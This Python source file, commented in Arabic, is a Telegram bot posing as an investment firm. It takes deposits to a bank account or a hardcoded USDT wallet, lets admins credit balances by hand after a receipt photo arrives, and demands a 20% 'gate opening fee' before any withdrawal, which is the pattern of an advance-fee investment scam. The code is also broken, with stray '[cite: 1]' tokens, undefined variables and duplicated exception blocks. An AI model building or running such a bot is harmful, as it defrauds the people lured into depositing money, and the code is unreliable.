import logging, os, sqlite3
from flask import Flask
from threading import Thread
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from telegram.request import HTTPXRequest
# --- 🌐 خادم الويب (لضمان استقرار السيرفر 24/7) --

app = Flask('')

@app.route('/')
def home():
    return "Sahm Bot is Online!"

def run():
    app.run(host='0.0.0.0', port=8080)

def keep_alive():
    t = Thread(target=run)
    t.start()


# إعداد السجلات
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# ================= [ ⚙️ إعدادات الإمبراطور ] =================
TOKEN = 'BOT_TOKEN'
ADMIN_USERNAME = 'HCICICVICIF9'
ADMINS_LIST = [6016547718, 6965265928]

# 🏦 الحل الذكي: قراءة الحسابات من إعدادات Render (Environment Variables) لسهولة التغيير
# إذا لم تضعها في Render، سيستخدم القيم الافتراضية المكتوبة هنا
BANK_ACCOUNT = os.environ.get('BANK_ACCOUNT', "يرجى التواصل مع الادارة للحصول على حسابنا البنكي")
CRYPTO_WALLET = os.environ.get('CRYPTO_WALLET', "TLtLuhkU2kkkR1Wz1TtrBTpoNRTNviYpsA")

# ===============================================================

# --- 🗄️ إدارة قاعدة البيانات المحلية ---

def init_db():
    conn = sqlite3.connect('sahm_v4_stable.db', check_same_thread=False)
    # التأكد من وجود الجدول الأساسي
    conn.execute('''CREATE TABLE IF NOT EXISTS users (
                    uid INTEGER PRIMARY KEY,
                    bal_sar REAL DEFAULT 0.0,
                    bal_usd REAL DEFAULT 0.0)''')

    # قائمة الأعمدة الجديدة التي نحتاج إضافتها للجدول القديم
    new_columns = [
        ('bal_ae', 'REAL DEFAULT 0.0'),
        ('bal_kw', 'REAL DEFAULT 0.0'),
        ('bal_qa', 'REAL DEFAULT 0.0')
    ]

    cursor = conn.cursor()
    for col_name, col_type in new_columns:
        try:
            # نحاول إضافة العمود، إذا كان موجوداً سيفشل الأمر وينتقل للي بعده
            cursor.execute(f"ALTER TABLE users ADD COLUMN {col_name} {col_type}")
            print(f"✅ تم إضافة العمود بنجاح: {col_name}")
        except sqlite3.OperationalError:
            # هذا يعني أن العمود موجود مسبقاً، لا نفعل شيئاً
            pass

    conn.commit()
    return conn
# تأكد أن هذا السطر موجود قبل أي دالة أخرى تستخدمه
db_conn = init_db()

def get_user_data(uid):
    # نستخدم global للتأكد أن الدالة ترى المتغير المعرف بالأعلى
    global db_conn
    cursor = db_conn.cursor()
    cursor.execute('SELECT bal_sar, bal_usd, bal_ae, bal_kw, bal_qa FROM users WHERE uid = ?', (uid,))
    row = cursor.fetchone()

    if not row:
        cursor.execute('INSERT INTO users (uid, bal_sar, bal_usd, bal_ae, bal_kw, bal_qa) VALUES (?, 0, 0, 0, 0, 0)', (uid,))
        db_conn.commit()
        return {"bal_sar": 0.0, "bal_usd": 0.0, "bal_ae": 0.0, "bal_kw": 0.0, "bal_qa": 0.0}

    return {
        "bal_sar": row[0], "bal_usd": row[1],
        "bal_ae": row[2],  "bal_kw": row[3],
        "bal_qa": row[4]
    }

def update_balance(uid, curr, amt):
    global db_conn
    cursor = db_conn.cursor()
    mapping = {
        'sr': 'bal_sar', 'us': 'bal_usd',
        'ae': 'bal_ae', 'kw': 'bal_kw', 'qa': 'bal_qa'
    }
    field = mapping.get(curr, "bal_sar")
    cursor.execute(f'UPDATE users SET {field} = {field} + ? WHERE uid = ?', (amt, uid))
    db_conn.commit()
# --- 🏠 الترحيب القوي ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    get_user_data(user.id)
    kb = [
        [InlineKeyboardButton("🇸🇦 استثمار (بالريال السعودي)", callback_data='c_sr'),
         InlineKeyboardButton("🇺🇸 استثمار (بالدولار)", callback_data='c_us')],
        [InlineKeyboardButton("🌍 الاستثمار بعملات أخرى", callback_data='other_currency')],
        [InlineKeyboardButton("🇰🇼 عروض الخليج والدول العربية 🌍", callback_data='gulf_offers')],
        [InlineKeyboardButton("💰 محفظتي المالية", callback_data='wallet')],
        [InlineKeyboardButton("📤 طلب سحب الأرباح", callback_data='withdraw')],
        [InlineKeyboardButton("💬 التواصل مع الإدارة", url=f"https://t.me/{ADMIN_USERNAME}")]
    ]
    welcome_text = (
        f"🏦 **مرحباً بكم في شركة الاولى العالميه للاستثمار**\n\n"
        f"السيد: **{user.first_name}**\n\n"
        f"أهلاً بك في منصتنا الرائدة. نحن هنا لنصنع مستقبلك المالي بأمان تام وعوائد مجزية.\n\n"
        f"💡 **يرجى اختيار القسم المطلوب للبدء:**"
    )
    if update.message: await update.message.reply_text(welcome_text, reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown')
    else: await update.callback_query.edit_message_text(welcome_text, reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown')

# --- 🔘 معالج الأزرار المطور ---
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    data, uid = query.data, query.from_user.id
    await query.answer()

    if data == 'main': await start(update, context)

    elif data == 'other_currency':
        await query.edit_message_text("🌍 **الاستثمار بالعملات الدولية:**\n\nيرجى التواصل مع الدعم الفني للحصول على حساباتنا البنكية الرسمية المتاحة في أي دولة حول العالم.",
                                     reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data='main')]]), parse_mode='Markdown')

    elif data == 'wallet':
        u = get_user_data(uid)
        wallet_msg = (
            "📊 **محفظتك المالية في شركة :**\n"
            "━━━━━━━━━━━━━━━\n"
            f"🇸🇦 **ريال سعودي:** `{u['bal_sar']:,}`\n"
            f"🇰🇼 **دينار كويتي:** `{u['bal_kw']:,}`\n"
            f"🇦🇪 **درهم إماراتي:** `{u['bal_ae']:,}`\n"
            f"🇶🇦 **ريال قطري:** `{u['bal_qa']:,}`\n"
            f"🇺🇸 **دولار (USDT):** `{u['bal_usd']:,}`\n"
            "━━━━━━━━━━━━━━━"
        )
        await query.edit_message_text(wallet_msg, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data='main')]]), parse_mode='Markdown')
# 1. أزرار اختيار نوع الاستثمار (ريال أو دولار)
    elif data in ['c_sr', 'c_us']:
        curr = 'sr' if data == 'c_sr' else 'us'
        # هذه هي المبالغ التي كنت تبحث عنها
        if curr == 'sr':
            prices = ["1000", "2000", "3000", "5000", "10000", "15000", "18000", "20000", "25000", "30000", "50000"]
            sym = "﷼"
        else:
            prices = ["300", "500", "800", "1000", "1500", "2000", "2500", "3000", "4000", "5000", "8000", "10000", "15000", "18000", "20000", "25000", "30000"]
            sym = "$"

        # بناء لوحة المبالغ (زرين في كل صف)
        btns = []
        for i in range(0, len(prices), 2):
            row = [InlineKeyboardButton(f"{p} {sym}", callback_data=f"{curr[0]}_{p}") for p in prices[i:i+2]]
            btns.append(row)

        btns.append([InlineKeyboardButton("🔙 رجوع", callback_data='main')])

        await query.edit_message_text(
            f"🏦 **يرجى اختيار مبلغ الاستثمار المطلوب ({sym}):**",
            reply_markup=InlineKeyboardMarkup(btns),
            parse_mode='Markdown'
        )

    # 2. معالجة اختيار المبلغ وإظهار الحساب البنكي أو المحفظة
    elif data.startswith(('s_', 'u_')):
        amt = data.split('_')[1]
        # إذا بدأ بـ s فهو ريال، وإذا بدأ بـ u فهو دولار
        if data.startswith('s_'):
            addr = BANK_ACCOUNT
            msg = f"✅ مبلغ الاستثمار المختار: **{amt} ريال**\n\nيرجى التحويل إلى الحساب البنكي:\n`{addr}`"
        else:
            addr = CRYPTO_WALLET
            msg = f"✅ مبلغ الاستثمار المختار: **{amt} دولار**\n\nيرجى التحويل إلى عنوان المحفظة:\n`{addr}`"

        await query.edit_message_text(
            f"{msg}\n\n📸 **أرسل صورة الإيصال هنا بعد إتمام العملية.**",
            parse_mode='Markdown'
        )
    elif data == 'withdraw':
        u = get_user_data(uid)

        # جمع الأرصدة للتأكد أنها ليست صفراً
        total_balance = sum([u['bal_sar'], u['bal_usd'], u['bal_ae'], u['bal_kw'], u['bal_qa']])

        if total_balance <= 0:
            await query.edit_message_text(
                "❌ **عذراً، رصيدك الحالي هو (0)**\n\nليس لديك رصيد متاح للسحب حالياً.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data='main')]]),
                parse_mode='Markdown'
            )
            return

        # إذا كان لديه رصيد، تظهر أزرار العملات
        msg = (f"📤 **إجراءات سحب الأرباح**\n\n"
               f"💰 **أرصدتك المتوفرة:**\n"
               f"🇸🇦 ريال: `{u['bal_sar']:,}` | 🇰🇼 دينار: `{u['bal_kw']:,}`\n"
               f"🇦🇪 درهم: `{u['bal_ae']:,}` | 🇺🇸 دولار: `{u['bal_usd']:,}`\n\n"
               f"يرجى اختيار العملة التي تود السحب منها:")

        kb = [
            [InlineKeyboardButton("🇸🇦 ريال سعودي", callback_data='wd_sr'),
             InlineKeyboardButton("🇦🇪 درهم إماراتي", callback_data='wd_ae')],
            [InlineKeyboardButton("🇰🇼 دينار كويتي", callback_data='wd_kw'),
             InlineKeyboardButton("💵 دولار (USDT)", callback_data='wd_us')],
            [InlineKeyboardButton("🔙 رجوع", callback_data='main')]
        ]
        await query.edit_message_text(msg, reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown')
    # عند اختيار العملة، نحفظ الاختيار ونطلب البيانات
    elif data.startswith('wd_'):
        currency_code = data.split('_')[1]
        context.user_data['wd_currency'] = currency_code
        # الآن فقط نبدأ بانتظار النص من المستخدم
        context.user_data['state'] = 'WAITING_WITHDRAW_INFO'

        await query.edit_message_text("📝 **يرجى إرسال بيانات التحويل الخاصة بك الآن:**")

        # ربط الكود بالرموز والأسماء
        mapping = {
            'sr': (u['bal_sar'], "﷼", "الحساب البنكي (الآيبان)"),
            'us': (u['bal_usd'], "$", "عنوان محفظة USDT (TRC20)"),
            'ae': (u['bal_ae'], "درهم", "بيانات التحويل البنكي"),
            'kw': (u['bal_kw'], "د.ك", "بيانات الكي-نت أو الحساب")
        }

        balance, symbol, detail_name = mapping.get(currency_code, (0, "", ""))

        if total_balance <= 0:
            await query.edit_message_text(
                "❌ **عذراً، رصيدك الحالي هو (0)**\n\nليس لديك رصيد متاح للسحب حالياً.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data='main')]]),
                parse_mode='Markdown'
            )
            return # تأكد أن السطر ينتهي بكلمة return فقط بدون أي إضافات
        # حفظ البيانات في مؤقت المستخدم
        context.user_data['wd_currency'] = currency_code
        context.user_data['wd_balance'] = balance
        context.user_data['wd_symbol'] = symbol
        context.user_data['state'] = 'WAITING_WITHDRAW_INFO'[cite: 1]

        fee = balance * 0.20 # حسبة الرسوم 20%

        instr = (
            f"💰 **رصيدك المتاح:** `{balance:,} {symbol}`\n"
            f"⚠️ **رسوم فتح البوابة (20%):** `{fee:,} {symbol}`\n\n"
            f"📝 **يرجى إرسال {detail_name} الآن:**\n"
            f"(تأكد من كتابة البيانات بدقة لضمان وصول الحوالة)"
        )
        await query.edit_message_text(instr, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ إلغاء", callback_data='main')]]), parse_mode='Markdown')
    elif data == 'gulf_offers':
        kb = [
            [InlineKeyboardButton("🇦🇪 عروض الإمارات", callback_data='off_ae'),
             InlineKeyboardButton("🇰🇼 عروض الكويت", callback_data='off_kw')],
            [InlineKeyboardButton("🇶🇦 عروض قطر", callback_data='off_qa'),
             InlineKeyboardButton("🇴🇲 عروض عمان", callback_data='off_om')],
            [InlineKeyboardButton("🔙 رجوع", callback_data='main')]
        ]
        await query.edit_message_text("🌍 **يرجى اختيار الدولة لعرض باقات الاستثمار المتاحة:**", reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown')

    elif data.startswith('off_'):
        country = data.split('_')[1]
        offers = {
            'ae': ("الإمارات 🇦🇪", ["500", "1000", "1500", "3000", "5000", "7000", "10000", "15000", "20000"], "درهم"),
            'kw': ("الكويت 🇰🇼", ["50", "100", "180", "250", "410", "575", "822", "1230", "2000", "3000"], "دينار"),
            'qa': ("قطر 🇶🇦", ["500", "1000", "1500", "2000", "3000", "5000", "7000", "10000", "15000", "20000"], "ريال"),
            'om': ("عمان 🇴🇲", ["500", "1000", "1500", "2000", "3000", "5000", "7000", "10000", "15000", "20000"], "ريال")
        }
        name, prices, currency = offers[country]

        # التعديل الجوهري: ربط العملات بـ s_ (للعملات الورقية) و u_ (للدولار)
        # إذا كانت العملة درهم/دينار/ريال ستعامل معاملة s_ (السعودي) لتظهر بيانات البنك
        btns = [[InlineKeyboardButton(f"{p} {currency}", callback_data=f"s_{p}") for p in prices[i:i+2]] for i in range(0, len(prices), 2)]
        btns.append([InlineKeyboardButton("🔙 رجوع", callback_data='gulf_offers')])

        await query.edit_message_text(f"✨ **عروض استثمار {name}:**\n\nاختر الباقة المناسبة لك:", reply_markup=InlineKeyboardMarkup(btns), parse_mode='Markdown')
    elif data == 'invest_now':
        msg = (f"🚀 **بدء الاستثمار**\n\n"
               f"للإيداع والحصول على حساباتنا البنكية الرسمية، يرجى التواصل مع الإدارة:\n\n"
               f"👉 [اضغط هنا للتواصل مع الإدارة](https://T.me/BIG_INVESTORS1)")
        await query.edit_message_text(msg, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data='main')]]), parse_mode='Markdown', disable_web_page_preview=True)
    elif data.startswith(('s_', 'u_')):
        amt = data.split('_')[1]
        addr = BANK_ACCOUNT if data.startswith('s_') else CRYPTO_WALLET
        await query.edit_message_text(f"✅ اخترت مبلغ: **{amt}**\n\nحول إلى:\n`{addr}`\n\n📸 أرسل صورة الإيصال هنا.", parse_mode='Markdown')


    elif data.startswith('ok_'):
        if uid not in ADMINS_LIST: return
        parts = data.split('_')

        try:
            ctype = parts[1]  # الكود (sr, kw, ae, us)
            val   = parts[2]  # المبلغ
            tid   = parts[3]  # الأيدي[cite: 1]

            # تحديد الرمز بناءً على الكود للرسالة فقط[cite: 1]
            symbols = {'sr': '﷼', 'kw': 'د.ك', 'ae': 'درهم', 'us': '$', 'qa': 'ريال'}
            symbol = symbols.get(ctype, '﷼')

            # التحديث الفعلي في قاعدة البيانات[cite: 1]
            update_balance(int(tid), ctype, float(val))

            await query.answer(f"✅ تم إضافة {val} {symbol}", show_alert=True)

            await context.bot.send_message(
                chat_id=int(tid),
                text=f"🎉 **أبشر.. تم إيداع `{val}` {symbol} في محفظتك بنجاح!**\n\nتأكد من رصيدك الآن عبر 'محفظتي'.",
                parse_mode='Markdown'
            )
            await query.answer(f"✅ تم إضافة {val} {symbol} لرصيد المشترك بنجاح. الأزرار لا تزال مفعلة.", show_alert=True)

        except Exception as e:
            await query.answer(f"❌ خطأ: {e}", show_alert=True)
            # إرسال رسالة للمشترك ليفرح بإضافة الرصيد
            try:
                await context.bot.send_message(
                    chat_id=int(tid),
                    text=f"🎉 **أبشر.. تم إيداع `{val}` {cur_display} في محفظتك بنجاح!**\n\nيمكنك الآن التحقق من رصيدك عبر قائمة 'محفظتي'.",
                    parse_mode='Markdown'
                )
            except:
                pass # في حال قام المشترك بحظر البوت

        except Exception as e:
            await query.answer(f"❌ خطأ في معالجة البيانات: {e}", show_alert=True)
        try:
            # إشعار المشترك
            await context.bot.send_message(int(tid), f"🎉 **أبشر.. تم إيداع `{val}` {('﷼' if cur=='sr' else '$')} في محفظتك!**", parse_mode='Markdown')
        except: pass

    elif data == 'delete_msg':
        if uid in ADMINS_LIST: await query.message.delete()

async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    await update.message.reply_text("✅ **استلمنا الإيصال، جاري المراجعة...**", parse_mode='Markdown')

    # دالة الأزرار: نرسل الكود (sr, ae, kw) بدلاً من الرمز لضمان الاستجابة
    def b(v, sym, code):
        return InlineKeyboardButton(f"➕ {v} {sym}", callback_data=f"ok_{code}_{v}_{user.id}")

    kb = [
        [b("1000", "﷼", "sr"), b("5000", "﷼", "sr"), b("10000", "﷼", "sr")],
        [b("100", "$", "us"), b("500", "$", "us"), b("1000", "$", "us")],
        [b("500", "درهم", "ae"), b("1000", "درهم", "ae"), b("5000", "درهم", "ae")],
        [b("50", "د.ك", "kw"), b("100", "د.ك", "kw"), b("250", "د.ك", "kw")],
    ]

    for adm in ADMINS_LIST:
        try:
            await context.bot.send_photo(
                chat_id=adm,
                photo=update.message.photo[-1].file_id,
                caption=f"🔔 **إيداع جديد من:** {user.first_name}\n🆔 الأيدي: `{user.id}`",
                reply_markup=InlineKeyboardMarkup(kb),
                parse_mode='Markdown'
            )
        except: pass


async def handle_user_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_data = context.user_data
    uid = update.effective_user.id
    text = update.message.text

    # التحقق من أن المستخدم في مرحلة إرسال بيانات السحب
    if user_data.get('state') == 'WAITING_WITHDRAW_INFO':
        currency = user_data.get('wd_currency')
        u = get_user_data(uid)

        # ربط الرموز والأسماء بالعملة المختارة
        mapping = {
            'sr': (u.get('bal_sar', 0), "﷼", "حساب بنكي"),
            'us': (u.get('bal_usd', 0), "$", "محفظة USDT"),
            'ae': (u.get('bal_ae', 0), "درهم", "حساب بنكي (إماراتي)"),
            'kw': (u.get('bal_kw', 0), "د.ك", "حساب بنكي (كويتي)")
        }

        balance, symbol, type_name = mapping.get(currency, (0, "", "بيانات تحويل"))

        # حسبة الرسوم 20%
        fee = balance * 0.20

        # صياغة الرد النهائي للمشترك (بياناتك كذا كذا)
        response = (
            f"👤 **عزيزي المشترك:** {update.effective_user.first_name}\n"
            f"📑 **بيانات السحب المستلمة ({type_name}):**\n"
            f"`{text}`\n\n"
            f"💰 **المبلغ المطلوب سحبه:** `{balance:,} {symbol}`\n"
            f"━━━━━━━━━━━━━━━\n"
            f"⚠️ **الرسوم المتوجبة لفتح البوابة (20%):**\n"
            f"💵 المطلوب سداده الآن: **`{fee:,} {symbol}`**\n"
            f"━━━━━━━━━━━━━━━\n"
            f"ℹ️ **ملاحظة:** يرجى تحويل مبلغ الرسوم أعلاه إلى حساب الإدارة، ثم إرسال صورة الإيصال هنا لتأكيد السحب فوراً."
        )

        # إرسال الرد للمشترك
        await update.message.reply_text(response, parse_mode='Markdown')

        # تنبيه الإدارة بالطلب الجديد مع كامل التفاصيل
        for adm in ADMINS_LIST:
            try:
                await context.bot.send_message(
                    chat_id=adm,
                    text=f"📥 **طلب سحب جديد من:** {update.effective_user.first_name}\n"
                         f"🆔 الأيدي: `{uid}`\n"
                         f"💰 المبلغ: {balance} {symbol}\n"
                         f"📝 البيانات: `{text}`",
                    parse_mode='Markdown'
                )
            except:
                pass

        # تصفير الحالة ليعود البوت لوضعه الطبيعي[cite: 1]
        user_data['state'] = None


if __name__ == '__main__':
        # 1. تشغيل خادم الحياة أولاً لكي يراه الأبتايم فوراً
        keep_alive() 
        print("✅ خادم الحياة يعمل، الأبتايم يمكنه رؤية البوت الآن.")

        # 2. إعدادات الاتصال بتليجرام
        t_request = HTTPXRequest(connect_timeout=60, read_timeout=60)

        # 3. بناء التطبيق
        app = Application.builder().token(TOKEN).request(t_request).build()

        # 4. إضافة المعالجات
        app.add_handler(CommandHandler('start', start))
        app.add_handler(CallbackQueryHandler(button_handler))
        app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
        app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_user_input))

        # 5. تشغيل البوت (هذا السطر يجب أن يكون الأخير دائماً)
        print("🚀 جاري الاتصال بتليجرام... بوت شركة سهم ينطلق!")
        app.run_polling(drop_pending_updates=True)
